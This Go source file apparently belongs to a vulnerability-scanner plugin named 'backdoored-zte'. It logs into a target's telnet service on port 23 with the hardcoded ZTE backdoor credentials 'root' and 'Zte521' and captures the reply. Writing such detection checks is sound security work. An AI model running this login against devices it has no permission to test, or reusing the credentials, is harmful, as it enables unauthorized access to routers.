package gox

import (
	"fmt"

	"slack/lib/protocols/netxclient"
	"slack/lib/util"
)

func backdoored_zte(target string, variableMap map[string]any) error {
	var err error

	variableMap["request"] = nil
	variableMap["response"] = nil

	hostname, err := util.Hostname(target)
	if err != nil {
		return err
	}
	host := fmt.Sprintf("%s:%s", hostname, "23")

	data, err := telnet_login(host, variableMap)
	if err != nil {
		host2, err := util.Host(target)
		if err != nil {
			return err
		}

		data2, err := telnet_login(host2, variableMap)
		if err != nil {
			return err
		}

		setResponse(data2, variableMap)
		setRequest(host2, variableMap)
		setFullTarget(host2, variableMap)

		return nil

	}

	setResponse(data, variableMap)
	setRequest(host, variableMap)
	setTarget(host, variableMap)
	setFullTarget(host, variableMap)

	return nil
}

func telnet_login(host string, variableMap map[string]any) (string, error) {
	nc, err := netxclient.NewNetClient(host, netxclient.Config{})
	if err != nil {
		return "", err
	}

	client, err := netxclient.NewClient(host, *nc.Config())
	if err != nil {
		return "", err
	}
	defer client.Close()

	err = client.Send([]byte("root\r\n"))
	if err != nil {
		return "", err
	}

	_, err = client.Receive()
	if err != nil {
		return "", err
	}

	err = client.Send([]byte("Zte521\r\n\r\n"))
	if err != nil {
		return "", err
	}

	data, err := client.Receive()
	if err != nil {
		return "", err
	}

	return string(data), nil
}

func init() {
	funcMap["backdoored-zte"] = backdoored_zte
}
